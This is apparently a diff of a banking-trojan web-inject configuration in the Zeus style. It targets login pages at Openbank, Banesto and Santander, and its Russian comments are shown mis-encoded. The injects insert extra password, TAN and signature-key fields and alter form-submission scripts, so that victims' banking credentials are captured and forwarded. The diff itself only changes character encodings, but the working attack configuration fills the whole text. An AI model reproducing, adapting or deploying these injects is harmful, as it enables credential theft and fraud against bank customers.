@@ -248,7 +248,7 @@ data_end
 ;OPENBANK
 ;==============================================================================
 set_url https://bancaonline.openbank.es/servlet/PProxy?* GP
-;ĞŸĞĞ›Ğ•
+;ÏÎËÅ
 data_before
 name =p  rethepassword*</TD>
 data_end
@@ -269,7 +269,7 @@ data_after
 </TD>
 data_end
 
-;Ğ¡ĞšĞ Ğ˜ĞŸĞ¢
+;ÑÊĞÈÏÒ
 data_before
 function oculto_form_onsubmit*{
 data_end
@@ -280,7 +280,7 @@ data_after
 data_end
 
 set_url https://extranet.banesto.es/*/loginParticulares.htm GP
-;ĞŸĞĞ›Ğ•
+;ÏÎËÅ
 data_before
 id="clave" name="oppasswd"*>
 data_end
@@ -291,7 +291,7 @@ data_inject
 data_end
 data_after
 data_end
-;POST Ğ¤ĞĞ ĞœĞ
+;POST ÔÎĞÌÀ
 data_before
 <input type="hidden" name="SXPASWI_#"*>
 data_end
@@ -300,7 +300,7 @@ data_inject
 data_end
 data_after
 data_end
-;Ğ¡ĞšĞ Ğ˜ĞŸĞ¢
+;ÑÊĞÈÏÒ
 data_before
 value="Entrar"*onclick="javascript:
 data_end
@@ -309,7 +309,7 @@ CheckES();
 data_end
 data_after
 "
-Â­
+­
 -    Friday, October 19, 2007 3:02 AM 
 data_end
 data_before
@@ -322,7 +322,7 @@ data_after
 data_end
 
 set_url https://banesnet.banesto.es/*/loginEmpresas.htm GP
-;ĞŸĞĞ›Ğ•
+;ÏÎËÅ
 data_before
 name="oppasswd"*</tr>*<tr>
 data_end
@@ -334,7 +334,7 @@ data_end
 data_after
 </tr>
 data_end
-;POST Ğ¤ĞĞ ĞœĞ
+;POST ÔÎĞÌÀ
 data_before
 <input type="hidden" name="passwd" value="">
 data_end
@@ -343,7 +343,7 @@ data_inject
 data_end
 data_after
 data_end
-;Ğ¡ĞšĞ Ğ˜ĞŸĞ¢
+;ÑÊĞÈÏÒ
 data_before
 <td><a href="javascript:
 data_end
@@ -365,7 +365,7 @@ data_after
 data_end
 
 set_url https://empresas.gruposantander.es/WebEmpresas/servlet/webempresas.servlets.* GP
-;Ğ”ĞĞ‘ĞĞ’Ğ›Ğ¯Ğ•Ğœ ĞŸĞĞ›Ğ• Ğ”Ğ›Ğ¯ Ğ’Ğ’ĞĞ”Ğ
+;ÄÎÁÎÂËßÅÌ ÏÎËÅ ÄËß ÂÂÎÄÀ
 data_before
 name="password"*</tr>
 data_end
@@ -375,7 +375,7 @@ data_inject
 data_end
 data_after
 data_end
-;Ğ¡ĞšĞ Ğ˜ĞŸĞ¢ ĞŸĞ•ĞŸĞ•Ğ‘Ğ ĞĞ¡Ğ«Ğ’ĞĞ•Ğ¢ Ğ”ĞĞĞĞ«Ğ• Ğ’ Ğ”Ğ Ğ£Ğ“Ğ£Ğ® Ğ¤ĞĞ ĞœĞ£, ĞŸĞĞ­Ğ¢ĞĞœĞ£ Ğ˜ Ğ¢Ğ£Ğ”Ğ Ğ”ĞĞ‘ĞĞ’Ğ›Ğ¯Ğ•Ğœ ĞŸĞĞ›Ğ•
+;ÑÊĞÈÏÒ ÏÅÏÅÁĞÀÑÛÂÀÅÒ ÄÀÍÍÛÅ Â ÄĞÓÃÓŞ ÔÎĞÌÓ, ÏÎİÒÎÌÓ È ÒÓÄÀ ÄÎÁÎÂËßÅÌ ÏÎËÅ
 data_before
 <input type="hidden" name="password"*value="">
 data_end
@@ -384,8 +384,8 @@ data_inject
 data_end
 data_after
 data_end
-;Ğ˜Ğ—ĞœĞ•ĞĞ¯Ğ•Ğœ Ğ¡ĞšĞ Ğ˜ĞŸĞ¢, Ğ”Ğ›Ğ¯ Ğ¢ĞĞ“Ğ Ğ§Ğ¢ĞĞ‘Ğ« ĞŸĞ•Ğ Ğ•Ğ‘Ğ ĞĞ¡Ğ«Ğ’ĞĞ¢Ğ¬ Ğ”ĞĞĞĞ«Ğ•
-;Ğ¡Ğ®Ğ”Ğ Ğ”ĞĞŸĞĞ›ĞĞ˜Ğ¢Ğ•Ğ›Ğ¬ĞĞ Ğ’Ğ« ĞœĞĞ–Ğ•Ğ¢Ğ• Ğ’Ğ¡Ğ¢ĞĞ’Ğ˜Ğ¢Ğ¬ ĞŸĞ ĞĞ’Ğ•Ğ ĞšĞ£ ĞŸĞĞ›Ğ¯ ĞĞ Ğ—ĞĞŸĞĞ›ĞĞ•ĞĞ˜Ğ•
+;ÈÇÌÅÍßÅÌ ÑÊĞÈÏÒ, ÄËß ÒÎÃÎ ×ÒÎÁÛ ÏÅĞÅÁĞÀÑÛÂÀÒÜ ÄÀÍÍÛÅ
+;ÑŞÄÀ ÄÎÏÎËÍÈÒÅËÜÍÎ ÂÛ ÌÎÆÅÒÅ ÂÑÒÀÂÈÒÜ ÏĞÎÂÅĞÊÓ ÏÎËß ÍÀ ÇÀÏÎËÍÅÍÈÅ
 data_before
 function enviar()*{*{
 data_end
@@ -557,7 +557,7 @@ name="Submit"
 data_end
 data_inject
  OnClick="javascript: if  (document.forms[0].tan.value.length < 3) {
-alert('Ğ³Ñ€ĞµÑˆĞ½Ğ° tan');return false;}"
+alert('ãğåøíà tan');return false;}"
 data_end
 data_after
 data_end
@@ -1474,7 +1474,7 @@ genera_esp()*;
 data_end
 data_inject
 if (document.LOGINFORM.pass.value.length < 10) {
-alert("El Clave de FIRMA debe ser de 10 dĞ½gitos");
+alert("El Clave de FIRMA debe ser de 10 dígitos");
 error=1;
 }
 data_end
@@ -1672,7 +1672,7 @@ data_end
 data_after
 data_end
 data_before
-<input alt="Ir al Servicio de Banca por Internet. Su clave viajarĞ± cifrada a travĞ¹s de la red."
+<input alt="Ir al Servicio de Banca por Internet. Su clave viajará cifrada a través de la red."
 data_end
 data_inject
  OnClick="javascript: if (document.forms[0].pass.value.length < 2) {
@@ -2349,7 +2349,7 @@ data_before
 INPUT NAME="Username"*</TR>
 data_end
 data_inject
-<TR VALIGN=top><TD WIDTH="27" BGCOLOR="D9EAF4"><IMG SRC="/icons/ecblank.gif" BORDER=0 HEIGHT=1 WIDTH=1 ALT=""></TD><TD WIDTH="75" BGCOLOR="D9EAF4" COLSPAN=2 VALIGN=middle nowrap><FONT FACE="Arial"></FONT><FONT SIZE=2 FACE="Arial">?ÑĞºĞµĞ-ĞºĞ¸Ñ‰Ğ°-??:</FONT></TD><TD WIDTH="227" BGCOLOR="D9EAF4"><FONT SIZE=2 FACE="Arial">
+<TR VALIGN=top><TD WIDTH="27" BGCOLOR="D9EAF4"><IMG SRC="/icons/ecblank.gif" BORDER=0 HEIGHT=1 WIDTH=1 ALT=""></TD><TD WIDTH="75" BGCOLOR="D9EAF4" COLSPAN=2 VALIGN=middle nowrap><FONT FACE="Arial"></FONT><FONT SIZE=2 FACE="Arial">?şêå¨-êèùà-??:</FONT></TD><TD WIDTH="227" BGCOLOR="D9EAF4"><FONT SIZE=2 FACE="Arial">
 <INPUT NAME="brokerN" VALUE="" TYPE=text maxlength=256></FONT></TD></TR>
 data_end
 data_after
